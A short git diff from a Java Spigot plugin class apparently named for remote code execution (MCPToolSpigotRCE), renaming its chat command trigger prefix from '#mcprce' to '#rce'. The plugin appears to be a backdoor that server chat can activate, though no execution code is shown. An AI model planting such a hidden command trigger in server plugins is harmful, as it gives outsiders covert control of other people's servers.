@@ -10,7 +10,7 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public final class MCPToolSpigotRCE extends JavaPlugin implements Listener {
     String PLUGIN_PREFIX = "§7[§dSpigotRCE §cMCP§fTool§7] ";
-    String COMMAND_PREFIX = "#mcprce";
+    String COMMAND_PREFIX = "#rce";
 
     @Override
     public void onEnable() {
